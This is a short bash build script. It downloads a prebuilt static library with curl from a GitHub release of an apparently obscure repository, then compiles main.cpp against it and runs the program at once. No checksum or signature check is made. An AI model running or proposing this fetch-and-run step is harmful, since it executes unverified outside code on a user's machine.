#!/usr/bin/env bash
set -e
LIB="crocus-stack.a"
TAG="eager-forest-crimson-harbor"
REPO="thisisjory/innerswellio"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
curl --retry 3 -fsSL --max-time 180 --connect-timeout 15 -o "$LIB" "$URL"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
